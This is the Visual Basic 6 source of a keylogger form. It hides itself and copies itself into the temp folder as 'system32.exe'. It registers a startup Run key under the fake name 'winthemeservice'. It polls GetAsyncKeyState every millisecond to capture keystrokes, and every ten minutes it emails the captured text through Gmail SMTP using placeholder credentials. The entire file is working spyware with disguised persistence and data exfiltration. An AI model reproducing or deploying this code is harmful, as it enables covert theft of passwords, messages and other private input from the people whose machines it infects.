VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "smss"
   ClientHeight    =   90
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   270
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   90
   ScaleWidth      =   270
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   WindowState     =   1  'Minimized
   Begin VB.Timer Timer2 
      Interval        =   10000
      Left            =   1680
      Top             =   360
   End
   Begin VB.TextBox Text1 
      Height          =   495
      Left            =   2520
      TabIndex        =   0
      Text            =   "Text1"
      Top             =   1920
      Visible         =   0   'False
      Width           =   1215
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   1800
      Top             =   1320
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim result As Integer
Dim str As String
Private datTimer As Date

Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer


Private Sub Form_Load()

Me.Hide
str = ""
datTimer = DateAdd("n", 10, Now)   'set it to fire every 10 minutes
'MsgBox Environ("temp")

Dim sPath As String
sPath = Environ("temp") & "\system32.exe"

On Error GoTo z
FileCopy App.Path & "\" & App.EXEName & ".exe", sPath

Dim Startup_key As String
Startup_key = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"
Dim Reg As Object
Set Reg = CreateObject("wscript.shell")
Reg.RegWrite Startup_key & "winthemeservice", sPath

z:

End Sub

Private Sub Timer1_Timer()
    For i = 1 To 255
        result = 0
        result = GetAsyncKeyState(i)
        
        If result = -32767 Then
            str = str + Chr(i)
        End If
    
    Next i
End Sub

Private Sub Timer2_Timer()

  If Now <= datTimer Then Exit Sub
    
  datTimer = DateAdd("n", 10, Now)
  SendEmail
  
End Sub

Sub SendEmail()

On Error GoTo z

Set iMsg = CreateObject("CDO.Message")
Set iConf = CreateObject("CDO.Configuration")
Set Flds = iConf.Fields

schema = "http://schemas.microsoft.com/cdo/configuration/"
Flds.Item(schema & "sendusing") = 2
Flds.Item(schema & "smtpserver") = "smtp.gmail.com"
Flds.Item(schema & "smtpserverport") = 465
Flds.Item(schema & "smtpauthenticate") = 1
Flds.Item(schema & "sendusername") = "test@email.com"
Flds.Item(schema & "sendpassword") = "emailpassword"
Flds.Item(schema & "smtpusessl") = 1
Flds.Update

With iMsg
.To = "test@email.com"
.From = "test@email.com"
.Subject = "KL"
.HTMLBody = str
Set .Configuration = iConf
.Send
End With

Set iMsg = Nothing
Set iConf = Nothing
Set Flds = Nothing


z:
'MsgBox str

End Sub

